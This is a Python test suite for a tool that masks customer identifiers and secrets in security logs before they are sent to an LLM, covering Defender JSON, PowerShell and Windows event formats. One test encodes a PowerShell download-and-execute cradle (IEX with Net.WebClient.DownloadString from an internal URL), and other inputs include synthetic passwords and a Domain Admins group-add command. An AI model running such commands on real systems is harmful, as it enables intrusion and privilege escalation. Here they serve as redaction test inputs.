    def fake_call(provider, api_key, model, system, messages, cfg, **k):
        captured["system"] = system
        return "ok"

    real_call, real_key = appmod.providers.call, appmod.get_api_key
    try:
        appmod.providers.call = fake_call
        appmod.get_api_key = lambda provider: "stub-key"

        # Default prompt when nothing saved.
        appmod.reset_system_prompt()
        d = appmod.get_system_prompt_route()
        check("default prompt when unset", not d["is_custom"]
              and d["prompt"] == appmod.DEFAULT_SYSTEM_PROMPT)

        # Save a custom prompt and confirm it persists + is used.
        appmod.save_system_prompt(appmod.SystemPromptRequest(prompt="ROBOT analyst."))
        check("custom prompt persisted",
              appmod.get_system_prompt_route()["is_custom"])

        # vault_context off: these checks assert the EXACT system string, and
        # a repeated value would otherwise append cross-incident context.
        res = appmod.analyze(appmod.AnalyzeRequest(
            logs="user=jsmith from 10.0.0.1", structured=False, use_system=True,
            vault_context=False))
        appmod.CONVERSATIONS.pop(res["conversation_id"], None)
        check("custom system prompt sent", captured["system"] == "ROBOT analyst.")

        # Toggle off: no system prompt sent (only instructions, if any).
        res = appmod.analyze(appmod.AnalyzeRequest(
            logs="user=jsmith from 10.0.0.1", structured=False, use_system=False,
            vault_context=False))
        appmod.CONVERSATIONS.pop(res["conversation_id"], None)
        check("system prompt suppressed when toggled off", captured["system"] == "")

        # Empty prompt rejected.
        try:
            appmod.save_system_prompt(appmod.SystemPromptRequest(prompt="   "))
            check("empty system prompt rejected", False)
        except Exception:
            check("empty system prompt rejected", True)

        # Reset restores the default.
        appmod.reset_system_prompt()
        check("reset clears custom prompt",
              not appmod.get_system_prompt_route()["is_custom"])
    finally:
        appmod.providers.call = real_call
        appmod.get_api_key = real_key
        _restore_file(appmod.CONFIG_FILE, backup)


def test_masking_stays_linear():
    """Masking was quadratic twice over: an O(n2) overlap scan and a full-text
    copy per replacement. A 1 MB log took minutes. Guard the fix — this is a
    denial-of-service property, not just a speed nicety."""
    import time
    line = ("2026-06-09 10:31:02 sshd[1234]: Failed password for jsmith from "
            "10.4.2.19 port 5121 ssh2 user=j.smith@acme-corp.com "
            "host=ws07.acme.local\n")
    text = (line * (1024 * 1024 // len(line) + 1))[:1024 * 1024]
    start = time.time()
    masker.mask(text, ["identities", "network", "secrets"], [], [])
    elapsed = time.time() - start
    # ~0.6 s on a 2024 laptop; 10 s still catches a return to quadratic, which
    # cost minutes at this size.
    check(f"1 MB masks in well under 10 s (took {elapsed:.2f}s)", elapsed < 10)


def test_defender_incident_json():
    """Microsoft Defender / Graph alert JSON. Synthetic values throughout.

    This payload is mostly vendor scaffolding — schema namespaces, console
    URLs, detector ids, file hashes — wrapped around a little customer data.
    Masking the scaffolding does not protect anyone and makes the alert
    unreadable, so the interesting assertions here are the ones about what
    survives."""
    raw = (
        '{"id":"c0ffee11-2222-3333-4444-555555555555_1",'
        '"detectorId":"8c19b234-81bb-4b72-b48c-1d40fffc3fa1",'
        '"tenantId":"6e330acc-b122-4abd-b2ce-db3b7237d432",'
        '"mitreTechniques":["T1204"],'
        '"alertWebUrl":"https://security.microsoft.com/alerts/c0ffee11?tid=6e330acc",'
        '"evidence":[{"@odata.type":"#microsoft.graph.security.deviceEvidence",'
        '"mdeDeviceId":"87b085b64f716d27b80a5d2f8f1ccb0689a48700",'
        '"deviceDnsName":"ws-fin-07.corp.example",'
        '"hostName":"ws-fin-07","dnsDomain":"corp.example",'
        '"lastIpAddress":"172.16.12.139","lastExternalIpAddress":"203.0.113.9",'
        '"ipInterfaces":["172.16.12.139","fe80::ab1c:a797:90a8:477c","127.0.0.1","::1"],'
        '"loggedOnUsers":[{"accountName":"jsmith","domainName":"CORP"}]},'
        '{"@odata.type":"#microsoft.graph.security.userEvidence",'
        '"userAccount":{"accountName":"jsmith","domainName":"CORP",'
        '"userSid":"S-1-5-21-2150773522-919722172-3827648958-30601",'
        '"userPrincipalName":"j.smith@example.org","displayName":"Smith, Jane"}},'
        '{"@odata.type":"#microsoft.graph.security.processEvidence",'
        '"processId":26992,"processCommandLine":"\\"powershell.exe\\" ",'
        '"imageFile":{"sha1":"613000dc53e7ef0b048021f68dd06c101994da29",'
        '"sha256":"7600ffe12da441fe89d035b13801e8e91d064bc544a27b19a5cf49f6ab8b18f5",'
        '"fileName":"powershell.exe",'
        '"filePath":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0",'
        '"filePublisher":"Microsoft Corporation"}}]}'
    )
    masked, mapping = masker.mask(raw, ALL)

    # --- customer data must go -------------------------------------------
    check("defender: UPN masked", "j.smith@example.org" not in masked)
    check("defender: display name masked", "Smith, Jane" not in masked)
    check("defender: sam account masked", "jsmith" not in masked)
    check("defender: SID masked", "S-1-5-21-2150773522" not in masked)
    check("defender: device name masked", "ws-fin-07" not in masked)
    check("defender: AD domain masked", "corp.example" not in masked)
    check("defender: NetBIOS domain masked", '"CORP"' not in masked)
    check("defender: internal IP masked", "172.16.12.139" not in masked)
    check("defender: external IP masked", "203.0.113.9" not in masked)
    check("defender: tenant id masked",
          "6e330acc-b122-4abd-b2ce-db3b7237d432" not in masked)
    check("defender: Defender device id masked",
          "87b085b64f716d27b80a5d2f8f1ccb0689a48700" not in masked)

    # --- vendor scaffolding must stay -------------------------------------
    check("defender: sha256 kept (it is the IOC)",
          "7600ffe12da441fe89d035b13801e8e91d064bc544a27b19a5cf49f6ab8b18f5" in masked)
    check("defender: sha1 kept", "613000dc53e7ef0b048021f68dd06c101994da29" in masked)
    check("defender: detector id kept (identifies the rule, not the customer)",
          "8c19b234-81bb-4b72-b48c-1d40fffc3fa1" in masked)
    check("defender: console hostname kept", "security.microsoft.com" in masked)
    check("defender: Graph type namespace kept",
          "microsoft.graph.security.deviceEvidence" in masked)
    check("defender: odata annotation kept", "@odata.type" in masked)
    check("defender: ATT&CK technique kept", "T1204" in masked)
    check("defender: loopback kept", '"127.0.0.1"' in masked)
    check("defender: IPv6 loopback kept", '"::1"' in masked)
    check("defender: system path kept",
          "System32" in masked and "WindowsPowerShell" in masked)
    check("defender: binary name kept", "powershell.exe" in masked)


def test_hash_keys_vs_credential_hashes():
    """A file hash is an IOC and stays; a credential hash is a secret and goes.
    The difference is the key it sits under, not the shape of the value."""
    keep = ("SHA256=6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D "
            "MD5=d41d8cd98f00b204e9800998ecf8427e")
    masked, _ = masker.mask(keep, ALL)
    check("sysmon SHA256= kept", "6E340B9C" in masked)
    check("sysmon MD5= kept", "d41d8cd98f00b204e9800998ecf8427e" in masked)

    creds = "user=jsmith hash=aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931"
    masked, _ = masker.mask(creds, ALL)
    check("a bare hash= is still treated as a credential",
          "aad3b435b51404ee" not in masked)


def test_loopback_is_not_customer_data():
    raw = ("client 127.0.0.1 connected; peer ::1; server 10.4.2.19; "
           "listener 0.0.0.0:8888")
    masked, _ = masker.mask(raw, ALL)
    check("IPv4 loopback kept", "127.0.0.1" in masked)
    check("IPv6 loopback kept", "::1" in masked)
    check("0.0.0.0 kept", "0.0.0.0" in masked)
    check("a real internal address is still masked", "10.4.2.19" not in masked)


def test_camelcase_namespace_is_not_a_hostname():
    raw = ('{"@odata.type":"#microsoft.graph.security.deviceEvidence",'
           '"event.kind":"alert","host":"dc-01.corp.local",'
           '"domain":"CORP.LOCAL","other":"Corp.Local"}')
    masked, _ = masker.mask(raw, ALL)
    check("camelCase namespace kept",
          "microsoft.graph.security.deviceEvidence" in masked)
    check("JSON key suffix kept", "event.kind" in masked)
    check("a real FQDN is still masked", "dc-01.corp.local" not in masked)
    check("an all-caps AD domain is still masked", "CORP.LOCAL" not in masked)
    check("a capitalised AD domain is still masked", "Corp.Local" not in masked)


# ---------------------------------------------------------------------------
# PowerShell.
#
# A Windows investigation is conducted in PowerShell, so a transcript, a
# script-block log (event 4104) or a pasted console session is one of the most
# common things to hand this tool — and PowerShell hides its identifiers in
# shapes no key=value pattern can reach. Every check below was written against
# output the masker got wrong before these patterns existed.
# ---------------------------------------------------------------------------

def test_powershell_transcript():
    raw = ("**********************\n"
           "Windows PowerShell transcript start\n"
           "Start time: 20260902141233\n"
           "Username: CORP\\a.novak\n"
           "RunAs User: CORP\\a.novak\n"
           "Machine: WKS-FIN-042 (Microsoft Windows NT 10.0.19045.0)\n"
           "Host Application: C:\\Windows\\System32\\WindowsPowerShell"
           "\\v1.0\\powershell.exe\n"
           "**********************\n"
           "PS C:\\Users\\a.novak> hostname\n"
           "WKS-FIN-042\n")
    masked, mapping = masker.mask(raw, ALL)
    check("transcript machine masked", "WKS-FIN-042" not in masked)
    check("transcript user masked", "a.novak" not in masked)
    # The header is the only line a pattern can anchor on; the bare echo two
    # lines down is the same machine and used to be sent in the clear.
    check("bare hostname echo masked too", masked.count("[HOST_1]") == 2
          or list(mapping.values()).count("WKS-FIN-042") == 1
          and "WKS-FIN-042" not in masked)
    # 14 digits, but no card fails its own check digit: this is a timestamp.
    check("transcript start time is not a credit card",
          "20260902141233" in masked)
    check("powershell's own install path kept",
          "WindowsPowerShell" in masked)


def test_powershell_parameters():
    raw = ("Invoke-Command -ComputerName WKS-FIN-042,WKS-FIN-043 -Credential "
           "CORP\\admin.tkaur -ScriptBlock { hostname }\n"
           "Enter-PSSession -HostName ubuntu-jump01 -UserName omid.b\n"
           "Get-ADUser -Identity a.novak -Properties *\n"
           "Add-ADGroupMember -Identity \"Domain Admins\" -Members "
           "a.novak,t.kaur,svc_deploy\n"
           "New-ADUser -Name \"Petra Vogel\" -SamAccountName p.vogel\n"
           "Get-Service -DisplayName \"Print Spooler\"\n"
           "Invoke-Command -ComputerName SRV-01 -Credential $cred\n")
    masked, _ = masker.mask(raw, ALL)
    # A space, not "=", separates a PowerShell parameter from its argument.
    for value in ("WKS-FIN-042", "WKS-FIN-043", "admin.tkaur", "ubuntu-jump01",
                  "omid.b", "a.novak", "t.kaur", "svc_deploy", "Petra Vogel",
                  "p.vogel"):
        check(f"parameter argument masked: {value}", value not in masked)
    check("a built-in group identifies nobody", "Domain Admins" in masked)
    check("a service display name is not a person", "Print Spooler" in masked)
    check("a variable is not a credential", "$cred" in masked)


def test_powershell_credentials():
    raw = ("$password = ConvertTo-SecureString 'Wint3r!2026' -AsPlainText "
           "-Force\n"
           "Register-ScheduledTask -User CORP\\svc_deploy -Password "
           "'D3pl0y!2026' -RunLevel Highest\n"
           "net use Z: \\\\FS-ARCHIVE-01\\payroll$ /user:CORP\\svc_backup "
           "Summer2026!\n"
           "Invoke-WebRequest -Headers @{Authorization=\"Bearer "
           "eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop\"}\n")
    masked, _ = masker.mask(raw, ALL)
    check("ConvertTo-SecureString literal masked", "Wint3r!2026" not in masked)
    check("-Password argument masked", "D3pl0y!2026" not in masked)
    check("net use positional password masked", "Summer2026!" not in masked)
    check("bearer token masked",
          "eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop" not in masked)
    # The cmdlet is what "$password =" is assigned; masking it there left the
    # actual credential standing in the next word.
    check("the cmdlet name is not the secret",
          "ConvertTo-SecureString" in masked)
    # \\FS-ARCHIVE-01\payroll$ used to be shredded into a bogus user
    # "ARCHIVE-01\payroll".
    check("UNC server masked as a server", "FS-ARCHIVE-01" not in masked)
    check("the share name survives", "payroll$" in masked)


def test_powershell_tables():
    users = ("Get-LocalUser\n\n"
             "Name              Enabled Description\n"
             "----              ------- -----------\n"
             "Administrator     False   Built-in account\n"
             "a.novak           True    Finance\n"
             "svc_backup        True    Veeam service account\n")
    masked, _ = masker.mask(users, ALL)
    check("table cell user masked", "a.novak" not in masked)
    check("table cell service account masked", "svc_backup" not in masked)
    check("built-in account kept", "Administrator" in masked)

    # The same shape, about software. Masking these protects nobody and makes
    # the output unreadable.
    services = ("Get-Service\n\n"
                "Status   Name               DisplayName\n"
                "------   ----               -----------\n"
                "Running  wuauserv           Windows Update\n"
                "Stopped  RemoteRegistry     Remote Registry\n")
    masked, mapping = masker.mask(services, ALL)
    check("Get-Service table untouched", not mapping)

    procs = ("Handles  NPM(K)    PM(K)     CPU(s)     Id  SI ProcessName\n"
             "-------  ------    -----     ------     --  -- -----------\n"
             "   1204      82   412508     882.31   8124   1 powershell\n")
    masked, mapping = masker.mask(procs, ALL)
    check("Get-Process table untouched", not mapping)


def test_powershell_encoded_command():
    import base64
    hidden = ("IEX(New-Object Net.WebClient).DownloadString"
              "('http://10.44.18.7:8080/a.ps1')")
    benign = "Get-Process | Sort-Object CPU -Descending"

    def enc(cmd):
        return base64.b64encode(cmd.encode("utf-16-le")).decode()

    masked, mapping = masker.mask(f"powershell.exe -nop -enc {enc(hidden)}",
                                  ALL)
    check("encoded command hiding an internal IP is masked",
          enc(hidden) not in masked)
    check("and it restores", masker.unmask(masked, mapping)
          .endswith(enc(hidden)))

    masked, mapping = masker.mask(f"powershell.exe -enc {enc(benign)}", ALL)
    # Masking this would cost the analyst the command and protect nobody: the
    # answer is the same either way, which is the test that makes it safe.
    check("encoded command hiding nothing is kept", enc(benign) in masked)


def test_powershell_keeps_runtime_names():
    raw = ("[System.Net.Dns]::GetHostByName($env:computerName)\n"
           "$cred = New-Object System.Management.Automation.PSCredential\n"
           "$wc.Proxy = New-WebProxy \"http://proxy-01.acme.local:8080\"\n"
           "WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\Client\n"
           "Path : Microsoft.PowerShell.Core\\FileSystem::\\\\NAS-01\\Finance\n")
    masked, _ = masker.mask(raw, ALL)
    for value in ("System.Net.Dns", "System.Management.Automation.PSCredential",
                  "$wc.Proxy", "Microsoft.WSMan.Management\\WSMan",
                  "Microsoft.PowerShell.Core\\FileSystem"):
        check(f".NET / provider name kept: {value}", value in masked)
    check("the customer's proxy is still masked",
          "proxy-01.acme.local" not in masked)
    check("the customer's file server is still masked",
          "NAS-01" not in masked)


def test_masked_value_does_not_survive_elsewhere():
    """The difference between "a pattern matched" and "the value is gone".

    A pattern anchors on one shape of a name; the same name then appears bare
    somewhere else in the same paste, where nothing marks it. Before this, the
    masker proved the value was sensitive and sent a copy of it anyway."""
    raw = ("DeviceName: WKS-FIN-042.corp.acme.local\n"
           "user=a.novak logged on\n"
           "Owner: CORP\\a.novak\n"
           "-- free text --\n"
           "The alert on WKS-FIN-042 was raised by a.novak in CORP.\n")
    masked, mapping = masker.mask(raw, ALL)
    for value in ("WKS-FIN-042", "a.novak", "CORP"):
        check(f"no copy of {value} survives", value not in masked)
    check("mapping still restores everything",
          "WKS-FIN-042.corp.acme.local" in masker.unmask(masked, mapping))


def test_one_placeholder_per_value():
    """Two patterns disagreeing about a label used to produce two aliases for
    one value, which reads as two different people."""
    raw = ("Get-Mailbox -Identity anna.novak@acme.com | fl\n"
           "PrimarySmtpAddress : anna.novak@acme.com\n")
    _masked, mapping = masker.mask(raw, ALL)
    aliases = [ph for ph, real in mapping.items()
               if real == "anna.novak@acme.com"]
    check("one address, one placeholder", len(aliases) == 1)


def test_leakguard_agrees_with_the_masker_on_loopback():
    """The guard is an independent second opinion, but it must not block a
    send over the one value the masker keeps by design: every
    Get-NetTCPConnection paste contains 127.0.0.1."""
    from log_masker import leakguard
    masked, mapping = masker.mask(
        "LocalAddress 127.0.0.1  RemoteAddress 10.4.2.19\n", ALL)
    findings = leakguard.scan(masked, mapping, [], ALL)
    check("loopback is not a blocking finding",
          not leakguard.has_blocking(findings))
    findings = leakguard.scan("connection from 10.4.2.19", {}, [], ALL)
    check("a routable address still blocks", leakguard.has_blocking(findings))


def test_credit_card_check_digit():
    raw = ("Start time: 20260902141233\n"
           "epoch 1581094030464317\n"
           "card 4111 1111 1111 1111\n")
    masked, _ = masker.mask(raw, ALL)
    check("timestamp is not a card", "20260902141233" in masked)
    check("epoch is not a card", "1581094030464317" in masked)
    check("a real card number is still masked",
          "4111 1111 1111 1111" not in masked)


def test_powershell_new_aduser():
    raw = ('New-ADUser -Name "Alice Walker" -GivenName "Alice" '
           '-Surname "Walker" -SamAccountName "awalker" '
           '-UserPrincipalName "alice.walker@corp.acme.local" '
           '-Path "OU=Finance,OU=Users,DC=corp,DC=acme,DC=local" '
           '-AccountPassword (ConvertTo-SecureString "Winter2026!Secure" '
           '-AsPlainText -Force) -Enabled $true\n'
           'Export-PfxCertificate -Cert "Cert:\\LocalMachine\\My\\ABCD" '
           '-Password (ConvertTo-SecureString "CertKey2026!" -AsPlainText '
           '-Force)\n')
    masked, _ = masker.mask(raw, ALL)
    for value in ("Alice Walker", "Alice", "Walker", "awalker",
                  "alice.walker@corp.acme.local", "Winter2026!Secure",
                  "CertKey2026!"):
        check(f"New-ADUser field masked: {value}", value not in masked)
    # "-Password (ConvertTo-SecureString ..." used to mask the cmdlet *and*
    # swallow the opening parenthesis, leaving the password beside it — and
    # then the propagation pass copied that mistake to both other uses.
    check("the command still parses",
          masked.count("(ConvertTo-SecureString") == 2)


def test_powershell_credential_in_parens():
    raw = ('Enter-PSSession -ComputerName 192.168.10.45 '
           '-Credential (Get-Credential "admin_service") -Port 5985\n')
    masked, _ = masker.mask(raw, ALL)
    check("account inside Get-Credential masked",
          "admin_service" not in masked)
    check("the port is not an account", "5985" in masked)


def test_sql_connection_string():
    raw = ('$connString = "Server=tcp:sql-prod.database.windows.net,1433;'
           'Initial Catalog=BillingDB;User ID=sqladmin_dbuser;'
           'Password=T0pS3cr3tDBPass!;Encrypt=True;"\n')
    masked, _ = masker.mask(raw, ALL)
    check("connection-string user masked", "sqladmin_dbuser" not in masked)
    check("connection-string password masked",
          "T0pS3cr3tDBPass!" not in masked)
    check("connection-string server masked",
          "sql-prod.database.windows.net" not in masked)
    check("tcp: is a protocol, not a host", "Server=tcp:" in masked)


def test_regex_string_is_not_a_username():
    """A -match pattern reads like a log line; "Account Name:\\s+" used to be
    masked down to its escape, which corrupts the command."""
    raw = ('Get-WinEvent -FilterHashtable @{LogName=\'Security\'; Id=4625} | '
           'Where-Object { $_.Message -match "Account Name:\\s+(?<user>\\w+)" }\n')
    masked, mapping = masker.mask(raw, ALL)
    check("the regex literal survives", "Account Name:\\s+" in masked)
    check("nothing was masked at all", not mapping)


def test_host_named_in_prose():
    raw = ('{"text":"User CORP\\\\r.chen logged into host WORKSTATION-88 '
           'from IP 192.168.100.54"}\n'
           'Enter-PSSession : Connecting to remote server '
           'SRV-SQL-03.corp.acme.local failed\n')
    masked, _ = masker.mask(raw, ALL)
    check("asset name after 'host' masked", "WORKSTATION-88" not in masked)
    # The keyword anchors it, but the value must still be taken whole: a span
    # that stops at "SRV-SQL-03" sends ".corp.acme.local" in the clear.
    check("the FQDN after 'server' is not truncated",
          "corp.acme.local" not in masked)
    check("'host is unreachable' is not a hostname",
          not masker.mask("the host is unreachable\n", ALL)[1])


def test_azure_cli_and_key_vault():
    raw = ('az login --service-principal -u "e7c234a1-89bc-4d32-b7e1-8932479'
           '23847" -p "this-is-not-a-real-secret" --tenant '
           '"acme.onmicrosoft.com"\n'
           'Get-AzKeyVaultSecret -VaultName "kv-prod-eastus-01" -Name '
           '"DatabaseAdminConnectionString" -AsPlainText\n')
    masked, _ = masker.mask(raw, ALL)
    check("service-principal secret masked",
          "this-is-not-a-real-secret" not in masked)
    check("key vault name masked", "kv-prod-eastus-01" not in masked)
    check("the tenant domain masked", "acme.onmicrosoft.com" not in masked)


def test_generic_domain_word_is_not_chased_through_prose():
    """The domain half of DOMAIN\\user is worth masking everywhere — unless it
    is an ordinary word, where every mention in a report would be redacted."""
    raw = ("Get-WmiObject -Credential \"STORAGE\\root_backup\"\n"
           "Get-WmiObject -Credential \"ACME7\\svc_ops\"\n"
           "--- SECTION 6: FILE SYSTEM, STORAGE & SMB SHARES ---\n"
           "the ACME7 domain was reached\n")
    masked, _ = masker.mask(raw, ALL)
    check("the qualified account is masked either way",
          "STORAGE\\root_backup" not in masked)
    check("a generic word is left alone in prose",
          "FILE SYSTEM, STORAGE & SMB SHARES" in masked)
    check("a real NetBIOS domain is still chased down",
          "ACME7" not in masked)


def test_windows_event_message_blob():
    """A forwarded Windows event puts the whole Message on one line, fields
    separated by two spaces. Three separate patterns misread that shape."""
    raw = ("<13>Sep 07 12:03:59 SV-APP-016.acme.lan AgentDevice=WindowsLog\t"
           "PluginVersion=WC.MSEVEN6.10.0.2.62\tComputer=SV-APP-016.acme.lan\t"
           "OriginatingComputer=10.4.2.180\tUser=\tDomain=\tEventID=4799\t"
           "Message=A security-enabled local group membership was enumerated."
           "  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  "
           "SV-APP-016$  Account Domain:  ACME  Logon ID:  0x3E7  Group:  "
           "Security ID:  BUILTIN\\Administrators  Group Name:  Administrators"
           "  Group Domain:  Builtin  Process Information:  Process ID:  0x740"
           "  Process Name:  C:\\Windows\\System32\\svchost.exe\n")
    masked, mapping = masker.mask(raw, ALL)

    # "Group Name:  Administrators  Group Domain: …" has no comma to stop at,
    # so the value ran to the end of the line and took every field with it.
    check("no placeholder swallows the rest of the line",
          all(len(v) < 60 for v in mapping.values()))
    check("the process path survives",
          "C:\\Windows\\System32\\svchost.exe" in masked)
    check("the group domain survives", "Group Domain:  Builtin" in masked)

    # "User=\tDomain=" -- an empty field let the capture skip the tab and take
    # the next key's own name as its value.
    check("an empty field does not mask the next key",
          "Domain" not in mapping.values())
    check("and the field itself is untouched", "User=\tDomain=" in masked)

    # A four-octet run starting part-way through a dotted string is a version.
    check("a version string is not an IP address",
          "WC.MSEVEN6.10.0.2.62" in masked)
    check("a real address is still masked", "10.4.2.180" not in masked)

    # What should go, still goes.
    check("the host is masked", "SV-APP-016.acme.lan" not in masked)
    check("the account domain is masked", "Account Domain:  ACME" not in masked)
    # And what is excluded on purpose is still excluded.
    check("built-in accounts stay readable",
          "NT AUTHORITY\\SYSTEM" in masked and "BUILTIN\\Administrators" in masked)


def test_path_components_are_not_hostnames():
    """"/etc/cron.hourly" is a directory. It is dotted like a domain and the
    last label is not on any file-extension list, so the FQDN pattern read it
    as a host and redacted a stock Linux path out of every cron line."""
    raw = ("<77>Sep  7 12:01:01 SV-LNUX-009 run-parts[1234567]: "
           "(/etc/cron.hourly) starting 0anacron\n"
           "systemd[1]: session-42.scope: Succeeded.\n"
           "/var/log/nginx/access.log.1 rotated, /etc/apt/sources.list.d read\n"
           "/etc/systemd/system/nginx.service reloaded\n")
    masked, mapping = masker.mask(raw, ALL)
    for path in ("/etc/cron.hourly", "session-42.scope", "access.log.1",
                 "sources.list.d", "nginx.service"):
        check(f"path component kept: {path}", path in masked)
    check("the host on the line is still masked", "SV-LNUX-009" not in masked)

    # Suffixes that are on no list at all -- neither a known file extension nor
    # a domain suffix. Nothing but the path lookbehind keeps these readable,
    # and ".cf" really is a country TLD, so the shape alone cannot decide.
    raw = ("postfix/smtpd: reading /etc/postfix/main.cf, /etc/nginx/x.backup "
           "and /opt/app/config.staging on host web01.acme.local\n")
    masked, _ = masker.mask(raw, ALL)
    for path in ("main.cf", "x.backup", "config.staging"):
        check(f"unlisted path suffix kept: {path}", path in masked)
    check("the host is still masked", "web01.acme.local" not in masked)

    # A real domain inside a path is still a domain -- the suffix is what
    # tells them apart -- and it must be masked whole, not from the second
    # label on ("acme-[HOST_2]").
    raw = ("vhost /var/www/acme-corp.com/htdocs served by web01.acme.local\n"
           "GET https://vpn.acme-corp.com/login\n")
    masked, mapping = masker.mask(raw, ALL)
    check("a domain in a path is masked", "acme-corp.com" not in masked)
    check("and masked whole", "acme-" not in masked)
    check("a URL host is unaffected by the path rule",
          "vpn.acme-corp.com" not in masked)
    check("one placeholder for the one domain",
          sum(1 for v in mapping.values() if v == "acme-corp.com") == 1)


def test_never_mask_terms():
    """The other half of the problem. Masking is best-effort, so it will
    sometimes fire on something that identifies nobody — and when it is one
    particular value rather than a whole class, editing a regex is the wrong
    tool."""
    raw = ("run-parts on host BUILD-SERVER-01 and host OTHER-NODE-02\n"
           "second mention of BUILD-SERVER-01 in prose\n")
    masked, mapping = masker.mask(raw, ALL)
    check("masked by default", "BUILD-SERVER-01" not in masked)

    masked, mapping = masker.mask(raw, ALL, keep_terms=["BUILD-SERVER-01"])
    check("kept once ruled non-sensitive", masked.count("BUILD-SERVER-01") == 2)
    check("and the ruling is confined to that value",
          "OTHER-NODE-02" not in masked)

    # It has to beat the conversation mapping too. The vault re-masks every
    # value it has ever seen, so a value learned before the ruling would keep
    # coming back and the rule would look broken.
    masked, _ = masker.mask("host BUILD-SERVER-01 again\n", ALL,
                            base_mapping={"[HOST_9]": "BUILD-SERVER-01"},
                            keep_terms=["BUILD-SERVER-01"])
    check("it beats a value the vault already knows",
          "BUILD-SERVER-01" in masked)

    # Case-insensitive, like the always-mask terms it mirrors.
    masked, _ = masker.mask("host build-server-01 lower\n", ALL,
                            keep_terms=["BUILD-SERVER-01"])
    check("matching ignores case", "build-server-01" in masked)


def test_leakguard_does_not_block_a_kept_value():
    """Ruling a value non-sensitive must not leave the guard blocking every
    send over it — loudest when the vault learned it before the ruling."""
    from log_masker import leakguard
    findings = leakguard.scan("host BUILD-SERVER-01 here",
                              {"[HOST_9]": "BUILD-SERVER-01"}, [], ALL,
                              keep_terms=["BUILD-SERVER-01"])
    check("no blocking finding for a kept value",
          not leakguard.has_blocking(findings))
    check("and it is not even warned about",
          not [f for f in findings if f["value"] == "BUILD-SERVER-01"])
    findings = leakguard.scan("host BUILD-SERVER-01 here",
                              {"[HOST_9]": "BUILD-SERVER-01"}, [], ALL)
    check("without the ruling it still blocks",
          leakguard.has_blocking(findings))


if __name__ == "__main__":
    test_masking_stays_linear()
    test_defender_incident_json()
    test_hash_keys_vs_credential_hashes()
    test_loopback_is_not_customer_data()
    test_camelcase_namespace_is_not_a_hostname()
    test_powershell_transcript()
    test_powershell_parameters()
    test_powershell_credentials()
    test_powershell_tables()
    test_powershell_encoded_command()
    test_powershell_keeps_runtime_names()
    test_masked_value_does_not_survive_elsewhere()
    test_one_placeholder_per_value()
    test_credit_card_check_digit()
    test_leakguard_agrees_with_the_masker_on_loopback()
    test_windows_event_message_blob()
    test_path_components_are_not_hostnames()
    test_never_mask_terms()
    test_leakguard_does_not_block_a_kept_value()
    test_powershell_new_aduser()
    test_powershell_credential_in_parens()
    test_sql_connection_string()
    test_regex_string_is_not_a_username()
    test_host_named_in_prose()
    test_azure_cli_and_key_vault()
    test_generic_domain_word_is_not_chased_through_prose()
    test_roundtrip()
    test_ipv6_vs_timestamp()
    test_bare_hostname_param()
    test_custom_terms()
    test_stable_placeholders()
    test_category_toggle()
    test_no_false_positive_filenames()
    test_windows_event_log()
    test_network_device_logs()
    test_sysmon_logs()
    test_sysmon_xml()
    test_sysmon_group()
    test_sysmon_xml_scaffolding()
    test_sysmon_linux()
    test_sysmon_patterns_earn_their_place()
    test_windows_path_is_not_an_account()
    test_sysmon_group_is_in_the_library()
    test_qradar_logs()
    test_linux_os_logs()
    test_cloud_json_logs()
    test_appliance_logs()
    test_vmware_and_proxy_logs()
    test_endpoint_security_logs()
    test_network_security_logs()
    test_azure_firewall_and_fp()
    test_dns_mail_infra_logs()
    test_wazuh_logs()
    test_squid_and_watchguard_logs()
    test_qradar_offense_csv()
    test_aws_connector_logs()
    test_identity_provider_connector_logs()
    test_saas_audit_connector_logs()
    test_cloud_platform_connector_logs()
    test_appliance_connector_logs()
    test_phishing_evidence_is_not_masked()
    test_connector_patterns_are_not_trigger_happy()
    test_custom_patterns()
    test_custom_patterns_persistence()
    test_conversation_mapping()
    test_custom_term_priority()
    test_builtin_overrides()
    test_template_library()
    test_template_suggestion()
    test_template_editing()
    test_verdict_parsing()
    test_verdict_robustness()
    test_leakguard_detectors()
    test_leakguard_gate()
    test_custom_store()
    test_system_prompt()
    print("\nAll masker tests passed.")
